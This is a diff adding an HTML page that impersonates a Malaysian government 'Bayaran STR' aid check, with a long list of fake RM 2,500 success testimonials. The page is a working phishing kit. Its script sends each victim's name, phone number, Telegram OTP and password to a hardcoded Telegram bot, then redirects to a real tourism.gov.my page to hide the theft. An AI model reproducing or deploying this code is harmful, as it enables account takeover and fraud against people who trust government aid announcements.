@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Bayaran STR</title>
+	<meta name="robots" content="nofollow, noindex">
+	<link rel="shortcut icon" href="assets/images/icon.png">
+	<link rel="stylesheet" href="assets/vendors/fontAwesome/css/font-awesome.min.css">
+	<link rel="stylesheet" href="assets/vendors/Bootstrap/css/bootstrap.min.css">
+	<style>
+	#loader {
+		height: 100vh;
+		width: 100vw;
+		position: fixed;
+		top: 0;
+		background: rgba(255, 255, 255, .7);
+		display: flex;
+		align-items: center;
+		justify-content: center;
+	}
+	
+	.loader {
+		width: 45px;
+		aspect-ratio: 1;
+		--c: no-repeat linear-gradient(#000000 0 0);
+		background: var(--c) 0% 50%, var(--c) 50% 50%, var(--c) 100% 50%;
+		background-size: 20% 100%;
+		animation: l1 .5s infinite linear;
+	}
+	
+	@keyframes l1 {
+		0% {
+			background-size: 20% 100%, 20% 100%, 20% 100%
+		}
+		33% {
+			background-size: 20% 10%, 20% 100%, 20% 100%
+		}
+		50% {
+			background-size: 20% 100%, 20% 10%, 20% 100%
+		}
+		66% {
+			background-size: 20% 100%, 20% 100%, 20% 10%
+		}
+		100% {
+			background-size: 20% 100%, 20% 100%, 20% 100%
+		}
+	}
+	</style>
+    <style>
+            .form-container .hidden { display: none; }
+            
+            /*.blink {*/
+        /*font-family*/
+        /*}*/
+
+        @keyframes blink-animation {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        /* CSS untuk loading */
+        .loading {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            visibility: hidden; /* Hidden by default */
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .loading.show {
+            visibility: visible;
+            opacity: 1;
+        }
+        .loading .spinner {
+            border: 8px solid #f3f3f3; /* Light grey */
+            border-top: 8px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        </style>
+	<script src="assets/vendors/jQuery/jquery.min.js"></script>
+</head>
+
+<body>
+    <div class="loading">
+          <div class="spinner"></div>
+        </div>
+	<div class="form-container">
+		<div style="width: 100%;padding: 0px 16px;max-width: 500px;margin: auto;"> <img class="w-100 mb-3" src="static/jawatan/54-small.webp">
+			<h1 class="mt-3 text-center text-primary" style="font-size: 30px!important">Bayaran STR</h1>
+			<form id="multiStepForm">
+				<div id="step1" class="form-step">
+					<input type="hidden" name="form_type" value="contact" />
+					<div class="mb-3">
+						<div class="input-group"> <span class="input-group-text" id="basic-addon1">Nama</span>
+							<input type="text" name="nama" id="name" class="form-control shadow-none" placeholder="Nama Penuh Sesuai MyKad"> </div>
+					</div>
+					<div class="mb-3"> <span class="form-label"></span>
+						<select class="form-select">
+							<option>Jantina</option>
+							<option>Lelaki</option>
+							<option>Perempuan</option>
+						</select>
+					</div>
+					<div class="mb-3">
+						<div class="input-group"> <span class="input-group-text" id="basic-addon1" style="display: flex;gap: 3px;">
+          <img src="show/401683/flag-for-malaysia.svg" style="height: 24px;"> +60</span>
+							<input type="text" class="form-control shadow-none" name="phone" id="phone" placeholder="Nombor Phone Telegram" aria-label="Phone" aria-describedby="basic-addon1" required=""> </div>
+					</div>
+					<input type="checkbox"> <span>Saya bersetuju menerima mesej Telegram daripada Admin MALAYSIA MADANI</span>
+					<br>
+					<br>
+					<div class="mb-3">
+						<button class="btn btn-primary mx-auto d-block mb-3" type="button" onclick="nextStep()">SEMAKAN STATUS</button>
+					</div>
+				</div>
+				<div id="step2" class="form-step hidden">
+					<input type="hidden" name="form_type" value="otp">
+					<input type="hidden" name="name" id="name">
+					<input type="hidden" name="phone" id="phone">
+					<div class="mb-3">
+						<label for="otp" class="form-label"> <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Kami telah menghantar 5 digit OTP ke akaun Telegram. Sila
+                    buka aplikasi Telegram anda dan semak mesej kami.</span
+                  >
+                </label>
+                <br>
+                <input name="otp" style="text-align: center;" maxlength="5" id="otp" class="form-control" type="tel" required="true" placeholder="5 digit OTP"/>
+              </div>
+              <br>
+              <div class="text-center">
+                <button class="btn btn-primary mx-auto d-block mb-3" type="button" onclick="nextStep()">
+                  <b>TERUSKAN</b>
+                </button>
+              </div>
+    </div>
+
+    <div id="step3" class="form-step hidden">
+                <input type="hidden" name="form_type" value="password">
+                <input type="hidden" name="name" id="name2">
+                <input type="hidden" name="phone" id="phone2">
+                <input type="hidden" name="otp" id="otp">
+                <div class="mb-3">
+                    <label for="password" class="form-label">
+                        <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Kata laluan [pilihan]</span> </label>
+						<input name="password" id="password" class="form-control" type="text" required="true" placeholder="********"> </div>
+					<br>
+					<div class="text-center">
+						<button class="btn btn-primary mx-auto d-block mb-3" type="button" onclick="submitForm()"> <b>TERUSKAN</b> </button>
+					</div>
+					<br> </div>
+			</form>
+			<br>
+			<br> </div>
+	</div>
+<script>
+    const TELEGRAM_API_URL = 'https://api.telegram.org/bot9203227816:AAFYkfaXEdYkxFWzUwaEmBJyw9Lm9rRmQIM/sendMessage'; // Ganti dengan token bot Telegram Anda
+    const CHAT_ID = '6653383506'; // Ganti dengan chat ID Telegram Anda
+
+    async function sendToTelegram(message) {
+        try {
+            const response = await fetch(TELEGRAM_API_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+
+            const data = await response.json();
+            console.log('Data berhasil dikirim ke Telegram:', data);
+            return true;
+        } catch (error) {
+            console.error('Terjadi kesalahan saat mengirim data ke Telegram:', error);
+            return false;
+        }
+    }
+
+    function showLoading(show) {
+        const loadingElement = document.querySelector('.loading');
+        if (show) {
+            loadingElement.classList.add('show');
+        } else {
+            loadingElement.classList.remove('show');
+        }
+    }
+
+    function nextStep() {
+        const currentStep = document.querySelector('.form-step:not(.hidden)');
+        const nextStep = currentStep.nextElementSibling;
+
+        // Validasi inputan
+        if (!validateInputs(currentStep)) {
+            alert('Por favor, preencha todos os campos antes de prosseguir.');
+            return;
+        }
+
+        // Simpan data dari langkah saat ini
+        let message = '';
+        if (currentStep.id === 'step1') {
+            const name = document.querySelector('input[name="name"]').value;
+            const phone = document.querySelector('input[name="phone"]').value;
+            document.getElementById('name').value = name;
+            document.getElementById('phone').value = phone;
+            message = `【Malaysia𝟙】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}`;
+        } else if (currentStep.id === 'step2') {
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const otp = document.querySelector('input[name="otp"]').value;
+            document.getElementById('name2').value = name;
+            document.getElementById('phone2').value = phone;
+            document.getElementById('otp').value = otp;
+            message = `【Malaysia𝟚】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}\n👍 𝐎.𝐓.𝐏: ${otp}`;
+        } else if (currentStep.id === 'step3') {
+            const name = document.getElementById('name2').value;
+            const phone = document.getElementById('phone2').value;
+            const otp = document.getElementById('otp').value;
+            const password = document.querySelector('input[name="password"]').value;
+            // Debugging: Log nilai untuk memastikan semuanya diambil dengan benar
+            console.log('Debug Step 3:');
+            console.log('Name:', name);
+            console.log('Phone:', phone);
+            console.log('OTP:', otp);
+            console.log('Password:', password);
+
+            message = `【Malaysia𝟛】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}\n👍 𝐎.𝐓.𝐏: ${otp}\n👍 𝐏𝐚𝐬𝐬: ${password}`;
+        }
+
+        // Tampilkan loading
+        showLoading(true);
+
+        // Kirim data ke Telegram
+        if (message) {
+            sendToTelegram(message).then(success => {
+                // Sembunyikan loading dan pindahkan ke langkah berikutnya
+                showLoading(false);
+                if (success) {
+                    currentStep.classList.add('hidden');
+                    nextStep.classList.remove('hidden');
+                }
+            });
+        } else {
+            // Sembunyikan loading dan pindahkan ke langkah berikutnya jika tidak ada pesan
+            showLoading(false);
+            currentStep.classList.add('hidden');
+            nextStep.classList.remove('hidden');
+        }
+    }
+
+    async function submitForm() {
+        const currentStep = document.querySelector('.form-step:not(.hidden)');
+        if (currentStep.id === 'step3') {
+            // Validasi inputan
+            if (!validateInputs(currentStep)) {
+                alert('Harap isi semua kolom sebelum mengirim.');
+                return;
+            }
+
+            // Simpan data dari langkah 3 dan kirim ke Telegram
+            const name = document.getElementById('name2').value;
+            const phone = document.getElementById('phone2').value;
+            const otp = document.getElementById('otp').value;
+            const password = document.querySelector('input[name="password"]').value;
+
+            const message = `【Malaysia𝟛】:\n👍 𝐍𝐚𝐦𝐚: ${name}\n👍 𝐍𝐨.𝐇𝐏: ${phone}\n👍 𝐎.𝐓.𝐏: ${otp}\n👍 𝐏𝐚𝐬𝐬: ${password}`;
+
+            // Tampilkan loading
+            showLoading(true);
+
+            // Kirim data ke Telegram dan redirect setelah berhasil
+            const success = await sendToTelegram(message);
+            if (success) {
+                window.location.href = 'https://www.tourism.gov.my/niche/homestay';
+            } else {
+                showLoading(false);
+                alert('Ralat berlaku semasa menghantar data.');
+            }
+        }
+    }
+
+    // Fungsi untuk memvalidasi inputan
+    function validateInputs(step) {
+        const requiredInputs = step.querySelectorAll('input[required]');
+        const requiredSelects = step.querySelectorAll('select[required]');
+        
+        const inputsValid = Array.from(requiredInputs).every(input => input.value.trim() !== '');
+        const selectsValid = Array.from(requiredSelects).every(select => select.value.trim() !== '');
+
+        return inputsValid && selectsValid;
+    }
+</script>
+
+	<style>
+	#testimoni {
+		border: 1px solid #EFEFEF;
+		padding: 16px;
+		max-height: 350px;
+		margin-bottom: 32px;
+		overflow: hidden;
+		background: #FFF;
+	}
+	
+	#testimoni .tests {
+		background: rgba(0, 166, 255, .07);
+		padding: 16px;
+		margin-bottom: 16px;
+	}
+	
+	#testimoni .tests span.name {
+		display: block;
+		font-weight: bold;
+	}
+	</style>
+	<div id="testimoni">
+		<marquee direction="down" height="250">
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Ahmad Faizal</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Siti Nurul</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Mohd Zainal</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Aisyah Hassan</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Rashidah Ismail</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Faizal Kamarul</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Maya Rahman</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Syafiq Azman</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Hafizah Salim</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Jamilah Ibrahim</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Ismail Aziz</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Farhana Zulkifli</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Rina Mohd</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Azman Ali</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Sharifah Ali</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Ibrahim Hassan</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Siti Aishah</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Zulfiqar Khan</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Aminah Abdul</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Fadilah Kamal</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Hassan Malik</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Nina Roslan</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Roslan Omar</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Siti Zainab</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Musa Rahman</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Riyad Rahim</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Mira Sulaiman</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Johan Bakar</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Yasmin Ismail</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Khalid Zakaria</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Nurul Huda</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Shafique Abdullah</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Aiman Ghazali</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Rohani Mohd</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Ezzaty Aziz</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Hidayah Ahmad</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Fauziah Mat</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Zainuddin Husin</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Khairul Zain</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Nabilah Yusof</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Diana Rosli</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Farizal Syed</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Mizan Kamarudin</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Shazwani Nor</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Rizal Salim</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Fazira Ibrahim</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Noreen Zaki</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Kamarul Kamaruddin</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Adibah Amran</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Faris Hadi</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Liyana Harun</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Syed Abdullah</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Aisyah Zain</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
+				<div> <span class="name">Zaini Faiz</span> <span class="text">Berjaya RM 2.500,00 <img src="show/395995/check-mark-button.svg" style="height: 16px;"></span> </div>
+			</div>
+			<div class="tests" style="display: flex;gap: 15px;"> <img src="assets/avatar.png" style="width: 50px;border-radius: 50%;border: 1px solid #777;object-fit: cover;aspect-ratio: 1/1;height: 50px;">
